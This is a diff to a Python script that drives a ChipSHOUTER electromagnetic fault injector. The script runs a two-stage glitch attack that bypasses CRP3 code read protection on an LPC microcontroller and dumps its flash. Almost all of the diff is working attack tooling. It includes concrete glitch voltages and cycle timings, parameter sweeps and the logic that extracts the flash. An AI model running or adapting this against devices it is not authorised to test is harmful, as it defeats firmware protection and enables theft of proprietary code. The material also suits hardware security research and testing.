@@ -16,8 +16,11 @@ SERIAL_PORT = '/dev/ttyACM0'
 BAUD_RATE = 115200
 TIMEOUT = 2.0
 
-def send_command(ser, cmd):
-    """Send command in API mode and check response"""
+def send_command(ser, cmd, verbose_cs=False):
+    """Send command in API mode and check response.
+
+    If verbose_cs=True and cmd starts with 'CS', print the full response.
+    """
     # Clear any pending data
     ser.read(ser.in_waiting)
 
@@ -32,17 +35,38 @@ def send_command(ser, cmd):
             if char == '.':
                 break
 
-    # Wait for '+' (success) or '!' (failure)
+    # Wait for '+' (success) or '!' (failure) and collect response
+    response = ""
+    success = None
     start = time.time()
-    while time.time() - start < 1.0:
+    while time.time() - start < 2.0:  # Longer timeout for CS commands
         if ser.in_waiting > 0:
             char = ser.read(1).decode('utf-8', errors='ignore')
+            response += char
             if char == '+':
-                return True
+                success = True
+                # Read any remaining response data
+                time.sleep(0.1)
+                if ser.in_waiting > 0:
+                    response += ser.read(ser.in_waiting).decode('utf-8', errors='ignore')
+                break
             elif char == '!':
-                return False
+                success = False
+                # Read any remaining response data
+                time.sleep(0.1)
+                if ser.in_waiting > 0:
+                    response += ser.read(ser.in_waiting).decode('utf-8', errors='ignore')
+                break
 
-    return False
+    # Print CS responses for debugging
+    if verbose_cs and cmd.upper().startswith('CS'):
+        response_clean = response.strip().replace('\r', '').replace('\n', ' | ')
+        if response_clean:
+            print(f"    [CS RESPONSE] {cmd}: {response_clean}", flush=True)
+        else:
+            print(f"    [CS RESPONSE] {cmd}: (no response)", flush=True)
+
+    return success if success is not None else False
 
 def send_command_get_data(ser, cmd, timeout=1.0):
     """Send command in API mode and return response data"""
@@ -164,17 +188,26 @@ def wait_for_cs_responsive(ser, timeout=5.0):
     print(f"  (Timeout after {check_count} status checks)")
     return False
 
-def wait_for_cs_armed(ser, timeout=5.0):
-    """Poll CS STATUS until ChipSHOUTER reports armed or timeout"""
+def wait_for_cs_armed(ser, timeout=5.0, min_checks=5):
+    """Poll CS STATUS until ChipSHOUTER reports armed for multiple consecutive checks.
+
+    The ChipSHOUTER reports 'armed' immediately but needs time to charge HV capacitor.
+    We poll multiple times to ensure it's fully ready.
+    """
     start = time.time()
     check_count = 0
+    armed_count = 0
     while time.time() - start < timeout:
         check_count += 1
         if check_cs_armed(ser):
-            print(f"  (Armed after {check_count} status checks)")
-            return True
-        time.sleep(0.2)  # Poll every 200ms
-    print(f"  (Timeout after {check_count} status checks)")
+            armed_count += 1
+            if armed_count >= min_checks:
+                print(f"  (Armed after {check_count} status checks)")
+                return True
+        else:
+            armed_count = 0  # Reset if not armed
+        time.sleep(0.3)  # Poll every 300ms
+    print(f"  (Timeout after {check_count} status checks, armed_count={armed_count})")
     return False
 
 def wait_for_response(ser, expected_text, timeout=5.0):
@@ -215,7 +248,7 @@ def setup_uart_trigger(ser, voltage, pause, width):
     send_command(ser, f"SET COUNT 1")
 
     # Configure UART trigger on '\r' character (0x0D) for ISP read commands
-    send_command(ser, "TRIGGER UART 13")  # 13 = '\r' (0x0D)
+    send_command(ser, "TRIGGER UART 0x0D")  # 0x0D = '\r' (carriage return)
 
 def read_flash_memory(ser, address, num_bytes, output_file, use_glitch=False, isp_voltage=None, isp_pause=None, isp_width=None, debug=True):
     """
@@ -268,17 +301,21 @@ def read_flash_memory(ser, address, num_bytes, output_file, use_glitch=False, is
         # Set trigger mode (CS stays armed from Stage 1, no need to re-arm CS)
         if debug:
             print("  [2.3] Setting CS trigger to HARDWARE HIGH...", flush=True)
-        send_command(ser, "CS TRIGGER HARDWARE HIGH")
+        send_command(ser, "CS TRIGGER HW HIGH")
 
-        # Check CS is still armed (should be from Stage 1)
+        # Wait for CS to be armed and ready (may need to re-arm after firing)
         if debug:
-            print("  [2.4] Checking CS armed status...", flush=True)
-        if wait_for_cs_armed(ser, timeout=0.5):
+            print("  [2.4] Waiting for CS armed and ready...", flush=True)
+        if not wait_for_cs_armed(ser, timeout=5.0):
+            # CS not armed, try to arm it
             if debug:
-                print("  ✓ CS still armed from Stage 1", flush=True)
-        else:
-            print("  ERROR: CS not armed! May need CS ARM", flush=True)
-            return False
+                print("  CS not armed, sending CS ARM...", flush=True)
+            send_command(ser, "CS ARM")
+            if not wait_for_cs_armed(ser, timeout=10.0):
+                print("  ERROR: CS failed to arm!", flush=True)
+                return False
+        if debug:
+            print("  ✓ CS armed and ready", flush=True)
 
         # Back to non-API mode for reading
         if debug:
@@ -384,6 +421,14 @@ def read_flash_memory(ser, address, num_bytes, output_file, use_glitch=False, is
     error_code = error_line[0]
     if error_code != '0':
         print(f"ERROR: Command failed with error code {error_code}", flush=True)
+        # Check CS status after glitch to see any errors
+        if use_glitch:
+            ser.write(b"API ON\r\n")
+            time.sleep(0.2)
+            ser.read(ser.in_waiting)
+            print("  [POST-GLITCH] Checking CS status for errors...", flush=True)
+            send_command(ser, "CS STATUS")
+            send_command(ser, "CS FAULTS")
         # Re-enable API mode before returning
         ser.write(b"API ON\r\n")
         time.sleep(0.2)
@@ -511,11 +556,14 @@ def read_flash_memory(ser, address, num_bytes, output_file, use_glitch=False, is
     print(f"✓ Flash memory saved to: {output_file}", flush=True)
     return True
 
-def test_crp3_to_crp2_glitch(ser, boot_voltage, boot_pause, boot_width, isp_voltage, isp_pause, isp_width, debug=True):
+def test_crp3_to_crp2_glitch(ser, boot_voltage, boot_pause, boot_width, isp_voltage, isp_pause, isp_width, debug=True, skip_stage1=False):
     """
     Perform two-stage CRP3 bypass:
     Stage 1: Boot ROM glitch (GPIO trigger) to enable ISP
     Stage 2: ISP read glitches (UART trigger) to bypass CRP2 protection
+
+    Args:
+        skip_stage1: If True, skip boot ROM glitch (ISP already enabled on target)
 
     Returns:
         tuple: (result, response_snippet, uue_file)
@@ -523,40 +571,51 @@ def test_crp3_to_crp2_glitch(ser, boot_voltage, boot_pause, boot_width, isp_volt
         response_snippet: First 100 chars of response for debugging
         uue_file: Path to saved .uue file if successful, None otherwise
     """
-    if debug:
-        print(f"\n=== STAGE 1: Boot ROM Glitch ===", flush=True)
-        print(f"  Parameters: V={boot_voltage} P={boot_pause} W={boot_width}", flush=True)
-
-    # === STAGE 1: Boot ROM Glitch (GPIO trigger @ 4 µs) ===
-    # Configure GPIO trigger for boot glitch
-    if debug:
-        print("  [1.1] Configuring GPIO trigger...", flush=True)
-    setup_gpio_trigger(ser, boot_voltage, boot_pause, boot_width)
-
-    if debug:
-        print("  [1.2] Setting CS trigger to HARDWARE HIGH...", flush=True)
-    send_command(ser, "CS TRIGGER HARDWARE HIGH")
-
-    # Check if CS is armed (should already be armed from initial setup)
-    if debug:
-        print("  [1.3] Checking CS armed status...", flush=True)
-    if not wait_for_cs_armed(ser, timeout=0.5):
-        print("  ERROR: CS not armed! This should have been done in initial setup", flush=True)
-        return "ERROR", "CS not armed", None
-    else:
+    if skip_stage1:
+        # === SKIP STAGE 1: ISP already enabled on target ===
         if debug:
-            print("  ✓ CS armed and ready", flush=True)
+            print(f"\n=== STAGE 1: SKIPPED (ISP always enabled) ===", flush=True)
 
-    # Arm the glitch trigger BEFORE TARGET SYNC
-    if debug:
-        print("  [1.5] Sending ARM ON (Pico trigger)...", flush=True)
-    send_command(ser, "ARM ON")
+        # Just sync with target (no reset, no glitch)
+        if debug:
+            print("  [1.1] Sending TARGET SYNC (no glitch)...", flush=True)
+        ser.write(b"TARGET SYNC 115200 12000 10 1\r\n")
+        success, response = wait_for_response(ser, "LPC ISP sync complete", timeout=5.0)
+    else:
+        # === STAGE 1: Boot ROM Glitch (GPIO trigger @ 4 µs) ===
+        if debug:
+            print(f"\n=== STAGE 1: Boot ROM Glitch ===", flush=True)
+            print(f"  Parameters: V={boot_voltage} P={boot_pause} W={boot_width}", flush=True)
 
-    # Try to SYNC with bootloader (1 attempt)
-    if debug:
-        print("  [1.6] Sending TARGET SYNC (will reset target and trigger boot glitch)...", flush=True)
-    ser.write(b"TARGET SYNC 115200 12000 10 1\r\n")
-    success, response = wait_for_response(ser, "LPC ISP sync complete", timeout=5.0)
+        # Configure GPIO trigger for boot glitch
+        if debug:
+            print("  [1.1] Configuring GPIO trigger...", flush=True)
+        setup_gpio_trigger(ser, boot_voltage, boot_pause, boot_width)
+
+        if debug:
+            print("  [1.2] Setting CS trigger to HARDWARE HIGH...", flush=True)
+        send_command(ser, "CS TRIGGER HW HIGH")
+
+        # Check if CS is armed (should already be armed from initial setup)
+        if debug:
+            print("  [1.3] Checking CS armed status...", flush=True)
+        if not wait_for_cs_armed(ser, timeout=0.5):
+            print("  ERROR: CS not armed! This should have been done in initial setup", flush=True)
+            return "ERROR", "CS not armed", None
+        else:
+            if debug:
+                print("  ✓ CS armed and ready", flush=True)
+
+        # Arm the glitch trigger BEFORE TARGET SYNC
+        if debug:
+            print("  [1.5] Sending ARM ON (Pico trigger)...", flush=True)
+        send_command(ser, "ARM ON")
+
+        # Try to SYNC with bootloader (1 attempt)
+        if debug:
+            print("  [1.6] Sending TARGET SYNC (will reset target and trigger boot glitch)...", flush=True)
+        ser.write(b"TARGET SYNC 115200 12000 10 1\r\n")
+        success, response = wait_for_response(ser, "LPC ISP sync complete", timeout=5.0)
 
     # Return response snippet for logging
     response_snippet = response[:150] if response else ""
@@ -605,41 +664,49 @@ def test_crp3_to_crp2_glitch(ser, boot_voltage, boot_pause, boot_width, isp_volt
         return "ERROR", response_snippet, None
 
 def main():
-    if len(sys.argv) < 11:
-        print("Usage: python3 crp3_to_crp2_glitch.py <boot_voltage> <boot_pause> <boot_width> <isp_voltage> <isp_pause> <isp_width> <voltage_sweep> <pause_sweep> <width_sweep> <iterations>")
-        print("\nTwo-stage CRP3 bypass attack:")
-        print("  Stage 1: Boot ROM glitch (GPIO trigger @ 4 µs)")
-        print("  Stage 2: ISP read glitch (UART trigger @ 45.67 µs)")
-        print()
-        print("Example: python3 crp3_to_crp2_glitch.py 290 600 150 290 6850 150 5 75 25 1000")
-        print()
-        print("Parameters:")
-        print("  boot_voltage  - ChipSHOUTER voltage for boot glitch (e.g., 290)")
-        print("  boot_pause    - Boot glitch delay in cycles @ 150MHz (e.g., 600 = 4µs)")
-        print("  boot_width    - Boot glitch width in cycles (e.g., 150)")
-        print("  isp_voltage   - ChipSHOUTER voltage for ISP read glitch (e.g., 290)")
-        print("  isp_pause     - ISP glitch delay in cycles @ 150MHz (e.g., 6850 = 45.67µs)")
-        print("  isp_width     - ISP glitch width in cycles (e.g., 150)")
-        print("  voltage_sweep - Sweep range for boot_voltage ±N volts (e.g., 5 = 285-295V)")
-        print("  pause_sweep   - Sweep range for boot_pause ±N cycles (e.g., 75 = ±0.5µs)")
-        print("  width_sweep   - Sweep range for boot_width ±N cycles (e.g., 25)")
-        print("  iterations    - Number of attempts (e.g., 1000)")
-        print()
-        print("Timing reference (@ 150MHz PIO clock):")
-        print("  Boot ROM CRP check: 4.0 µs = 600 cycles (±75 cycles = ±0.5µs sweep)")
-        print("  ISP Read CRP check: 45.67 µs = 6850 cycles (±300 cycles = ±2µs sweep)")
-        sys.exit(1)
+    import argparse
 
-    boot_voltage = int(sys.argv[1])
-    boot_pause = int(sys.argv[2])
-    boot_width = int(sys.argv[3])
-    isp_voltage = int(sys.argv[4])
-    isp_pause = int(sys.argv[5])
-    isp_width = int(sys.argv[6])
-    voltage_sweep = int(sys.argv[7])
-    pause_sweep = int(sys.argv[8])
-    width_sweep = int(sys.argv[9])
-    iterations = int(sys.argv[10])
+    parser = argparse.ArgumentParser(
+        description='CRP3 Two-Stage Bypass Attack',
+        formatter_class=argparse.RawDescriptionHelpFormatter,
+        epilog='''
+Two-stage CRP3 bypass attack:
+  Stage 1: Boot ROM glitch (GPIO trigger @ 4 µs) - can be skipped with --skip-stage1
+  Stage 2: ISP read glitch (UART trigger @ 45.67 µs)
+
+Example: python3 crp3_to_crp2_glitch.py 290 600 150 290 6850 150 5 75 25 1000
+Example (skip stage 1): python3 crp3_to_crp2_glitch.py --skip-stage1 0 0 0 290 6274 150 0 0 0 100
+
+Timing reference (@ 150MHz PIO clock):
+  Boot ROM CRP check: 4.0 µs = 600 cycles (±75 cycles = ±0.5µs sweep)
+  ISP Read CRP check: 45.67 µs = 6850 cycles (±300 cycles = ±2µs sweep)
+''')
+    parser.add_argument('boot_voltage', type=int, help='ChipSHOUTER voltage for boot glitch (e.g., 290)')
+    parser.add_argument('boot_pause', type=int, help='Boot glitch delay in cycles @ 150MHz (e.g., 600 = 4µs)')
+    parser.add_argument('boot_width', type=int, help='Boot glitch width in cycles (e.g., 150)')
+    parser.add_argument('isp_voltage', type=int, help='ChipSHOUTER voltage for ISP read glitch (e.g., 290)')
+    parser.add_argument('isp_pause', type=int, help='ISP glitch delay in cycles @ 150MHz (e.g., 6850 = 45.67µs)')
+    parser.add_argument('isp_width', type=int, help='ISP glitch width in cycles (e.g., 150)')
+    parser.add_argument('voltage_sweep', type=int, help='Sweep range for boot_voltage ±N volts (e.g., 5 = 285-295V)')
+    parser.add_argument('pause_sweep', type=int, help='Sweep range for boot_pause ±N cycles (e.g., 75 = ±0.5µs)')
+    parser.add_argument('width_sweep', type=int, help='Sweep range for boot_width ±N cycles (e.g., 25)')
+    parser.add_argument('iterations', type=int, help='Number of attempts (e.g., 1000)')
+    parser.add_argument('--skip-stage1', action='store_true',
+                       help='Skip Stage 1 boot glitch (for targets with ISP always enabled)')
+
+    args = parser.parse_args()
+
+    boot_voltage = args.boot_voltage
+    boot_pause = args.boot_pause
+    boot_width = args.boot_width
+    isp_voltage = args.isp_voltage
+    isp_pause = args.isp_pause
+    isp_width = args.isp_width
+    voltage_sweep = args.voltage_sweep
+    pause_sweep = args.pause_sweep
+    width_sweep = args.width_sweep
+    iterations = args.iterations
+    skip_stage1 = args.skip_stage1
 
     # Calculate actual ranges (accounting for 0 floor)
     actual_v_min = max(0, boot_voltage - voltage_sweep)
@@ -647,12 +714,18 @@ def main():
     actual_w_min = max(0, boot_width - width_sweep)
 
     print("=" * 70)
-    print("CRP3 TWO-STAGE BYPASS ATTACK")
+    if skip_stage1:
+        print("CRP3 BYPASS ATTACK (Stage 1 SKIPPED - ISP always enabled)")
+    else:
+        print("CRP3 TWO-STAGE BYPASS ATTACK")
     print("=" * 70)
-    print("Stage 1: Boot ROM Glitch (GPIO trigger)")
-    print(f"  Voltage: {boot_voltage} ±{voltage_sweep}V ({actual_v_min}-{boot_voltage+voltage_sweep}V)")
-    print(f"  Pause: {boot_pause} ±{pause_sweep} cycles ({actual_p_min}-{boot_pause+pause_sweep}, {boot_pause/150:.2f} µs @ 150MHz)")
-    print(f"  Width: {boot_width} ±{width_sweep} cycles ({actual_w_min}-{boot_width+width_sweep})")
+    if skip_stage1:
+        print("Stage 1: SKIPPED (target has ISP always enabled)")
+    else:
+        print("Stage 1: Boot ROM Glitch (GPIO trigger)")
+        print(f"  Voltage: {boot_voltage} ±{voltage_sweep}V ({actual_v_min}-{boot_voltage+voltage_sweep}V)")
+        print(f"  Pause: {boot_pause} ±{pause_sweep} cycles ({actual_p_min}-{boot_pause+pause_sweep}, {boot_pause/150:.2f} µs @ 150MHz)")
+        print(f"  Width: {boot_width} ±{width_sweep} cycles ({actual_w_min}-{boot_width+width_sweep})")
     print()
     print("Stage 2: ISP Read Glitch (UART trigger)")
     print(f"  Voltage: {isp_voltage}V")
@@ -710,7 +783,7 @@ def main():
         print("✓ ChipSHOUTER ready")
 
         print("Arming ChipSHOUTER...")
-        send_command(ser, "CS TRIGGER HARDWARE HIGH")
+        send_command(ser, "CS TRIGGER HW HIGH")
         send_command(ser, "CS ARM")
 
         # Wait for armed status by polling CS STATUS
@@ -735,30 +808,38 @@ def main():
         # Generate parameter sweep
         import random
         param_combinations = []
-        for _ in range(iterations):
-            # Sweep boot voltage, pause, and width around center values
-            # Calculate ranges that don't go below 0
-            v_min = max(0, boot_voltage - voltage_sweep)
-            v_max = boot_voltage + voltage_sweep
-            p_min = max(0, boot_pause - pause_sweep)
-            p_max = boot_pause + pause_sweep
-            w_min = max(0, boot_width - width_sweep)
-            w_max = boot_width + width_sweep
 
-            v = random.randint(v_min, v_max)
-            p = random.randint(p_min, p_max)
-            w = random.randint(w_min, w_max)
-            param_combinations.append((v, p, w))
+        if skip_stage1:
+            # When skipping Stage 1, boot parameters don't matter
+            # Just generate iterations with dummy boot params
+            for _ in range(iterations):
+                param_combinations.append((0, 0, 0))
+            print(f"Generated {len(param_combinations)} iterations (Stage 1 skipped)")
+        else:
+            for _ in range(iterations):
+                # Sweep boot voltage, pause, and width around center values
+                # Calculate ranges that don't go below 0
+                v_min = max(0, boot_voltage - voltage_sweep)
+                v_max = boot_voltage + voltage_sweep
+                p_min = max(0, boot_pause - pause_sweep)
+                p_max = boot_pause + pause_sweep
+                w_min = max(0, boot_width - width_sweep)
+                w_max = boot_width + width_sweep
 
-        # Calculate actual ranges (accounting for 0 floor)
-        actual_v_min = max(0, boot_voltage - voltage_sweep)
-        actual_p_min = max(0, boot_pause - pause_sweep)
-        actual_w_min = max(0, boot_width - width_sweep)
+                v = random.randint(v_min, v_max)
+                p = random.randint(p_min, p_max)
+                w = random.randint(w_min, w_max)
+                param_combinations.append((v, p, w))
 
-        print(f"Generated {len(param_combinations)} parameter combinations")
-        print(f"  Boot voltage range: {actual_v_min} to {boot_voltage+voltage_sweep}V")
-        print(f"  Boot pause range: {actual_p_min} to {boot_pause+pause_sweep} cycles")
-        print(f"  Boot width range: {actual_w_min} to {boot_width+width_sweep} cycles")
+            # Calculate actual ranges (accounting for 0 floor)
+            actual_v_min = max(0, boot_voltage - voltage_sweep)
+            actual_p_min = max(0, boot_pause - pause_sweep)
+            actual_w_min = max(0, boot_width - width_sweep)
+
+            print(f"Generated {len(param_combinations)} parameter combinations")
+            print(f"  Boot voltage range: {actual_v_min} to {boot_voltage+voltage_sweep}V")
+            print(f"  Boot pause range: {actual_p_min} to {boot_pause+pause_sweep} cycles")
+            print(f"  Boot width range: {actual_w_min} to {boot_width+width_sweep} cycles")
         print()
 
         with open(csv_file, 'w', newline='', buffering=1) as f:
@@ -772,7 +853,8 @@ def main():
                 result, response, uue_file = test_crp3_to_crp2_glitch(
                     ser,
                     test_boot_voltage, test_boot_pause, test_boot_width,
-                    isp_voltage, isp_pause, isp_width
+                    isp_voltage, isp_pause, isp_width,
+                    skip_stage1=skip_stage1
                 )
 
                 test_elapsed = time.time() - test_start
@@ -788,7 +870,8 @@ def main():
                 if result == "SUCCESS":
                     success_count += 1
                     print(f"\n[{i+1}/{iterations}] ✓✓✓ FULL CRP3 BYPASS SUCCESS! ✓✓✓", flush=True)
-                    print(f"  Boot glitch: V={test_boot_voltage} P={test_boot_pause} W={test_boot_width}", flush=True)
+                    if not skip_stage1:
+                        print(f"  Boot glitch: V={test_boot_voltage} P={test_boot_pause} W={test_boot_width}", flush=True)
                     print(f"  ISP glitch: V={isp_voltage} P={isp_pause} W={isp_width}", flush=True)
                     if uue_file:
                         print(f"  Flash dump saved to: {uue_file}", flush=True)
@@ -797,7 +880,10 @@ def main():
                     break
                 elif result == "PARTIAL":
                     partial_count += 1
-                    print(f"\n[{i+1}/{iterations}] ⚠ PARTIAL: Boot glitch worked, ISP read failed", flush=True)
+                    if skip_stage1:
+                        print(f"\n[{i+1}/{iterations}] ⚠ PARTIAL: ISP sync worked, ISP read failed", flush=True)
+                    else:
+                        print(f"\n[{i+1}/{iterations}] ⚠ PARTIAL: Boot glitch worked, ISP read failed", flush=True)
                 elif result == "FAIL":
                     fail_count += 1
                 elif result == "ERROR":
@@ -813,8 +899,12 @@ def main():
 
                     print(f"\n[{i+1}/{iterations}] Progress: {(i+1)/iterations*100:.1f}%", flush=True)
                     print(f"  SUCCESS (full): {success_count} ({success_count/(i+1)*100:.2f}%)", flush=True)
-                    print(f"  PARTIAL (boot only): {partial_count} ({partial_count/(i+1)*100:.2f}%)", flush=True)
-                    print(f"  FAIL: {fail_count} ({fail_count/(i+1)*100:.2f}%)", flush=True)
+                    if skip_stage1:
+                        print(f"  PARTIAL (sync only): {partial_count} ({partial_count/(i+1)*100:.2f}%)", flush=True)
+                        print(f"  FAIL (sync failed): {fail_count} ({fail_count/(i+1)*100:.2f}%)", flush=True)
+                    else:
+                        print(f"  PARTIAL (boot only): {partial_count} ({partial_count/(i+1)*100:.2f}%)", flush=True)
+                        print(f"  FAIL (boot failed): {fail_count} ({fail_count/(i+1)*100:.2f}%)", flush=True)
                     print(f"  ERROR: {error_count} ({error_count/(i+1)*100:.2f}%)", flush=True)
                     print(f"  Speed: {tests_per_sec:.2f} tests/sec", flush=True)
                     print(f"  Remaining: {remaining/60:.1f} minutes\n", flush=True)
@@ -825,7 +915,10 @@ def main():
                 if success_count > 0 and (i+1) % 10 == 0:
                     print(f"\n✓ Found {success_count} successful full CRP3 bypass(es) so far!", flush=True)
                 if partial_count > 0 and (i+1) % 10 == 0:
-                    print(f"⚠ Found {partial_count} partial success(es) (boot glitch worked)", flush=True)
+                    if skip_stage1:
+                        print(f"⚠ Found {partial_count} partial success(es) (sync worked)", flush=True)
+                    else:
+                        print(f"⚠ Found {partial_count} partial success(es) (boot glitch worked)", flush=True)
 
         # Final summary
         elapsed = time.time() - start_time
@@ -839,8 +932,12 @@ def main():
         print()
         print("Results:")
         print(f"  SUCCESS (full bypass):   {success_count:5d} ({success_count/total_tests*100:6.2f}%)")
-        print(f"  PARTIAL (boot only):     {partial_count:5d} ({partial_count/total_tests*100:6.2f}%)")
-        print(f"  FAIL (boot failed):      {fail_count:5d} ({fail_count/total_tests*100:6.2f}%)")
+        if skip_stage1:
+            print(f"  PARTIAL (sync only):     {partial_count:5d} ({partial_count/total_tests*100:6.2f}%)")
+            print(f"  FAIL (sync failed):      {fail_count:5d} ({fail_count/total_tests*100:6.2f}%)")
+        else:
+            print(f"  PARTIAL (boot only):     {partial_count:5d} ({partial_count/total_tests*100:6.2f}%)")
+            print(f"  FAIL (boot failed):      {fail_count:5d} ({fail_count/total_tests*100:6.2f}%)")
         print(f"  ERROR:                   {error_count:5d} ({error_count/total_tests*100:6.2f}%)")
         print()
         print(f"Results saved to: {csv_file}")
@@ -849,13 +946,17 @@ def main():
         if success_count > 0:
             print()
             print("✓✓✓ CRP3 FULL BYPASS SUCCESSFUL! ✓✓✓")
-            print(f"Boot glitch: V={boot_voltage}, P={boot_pause}, W={boot_width}")
+            if not skip_stage1:
+                print(f"Boot glitch: V={boot_voltage}, P={boot_pause}, W={boot_width}")
             print(f"ISP glitch: V={isp_voltage}, P={isp_pause}, W={isp_width}")
             print("Target flash memory successfully extracted!")
         elif partial_count > 0:
             print()
-            print("⚠ PARTIAL SUCCESS: Boot glitch worked, ISP read needs tuning")
-            print(f"Boot glitch parameters: V={boot_voltage}, P={boot_pause}, W={boot_width}")
+            if skip_stage1:
+                print("⚠ PARTIAL SUCCESS: ISP sync worked, ISP read needs tuning")
+            else:
+                print("⚠ PARTIAL SUCCESS: Boot glitch worked, ISP read needs tuning")
+                print(f"Boot glitch parameters: V={boot_voltage}, P={boot_pause}, W={boot_width}")
             print("Recommendation: Adjust ISP glitch parameters (pause/width)")
 
     finally:
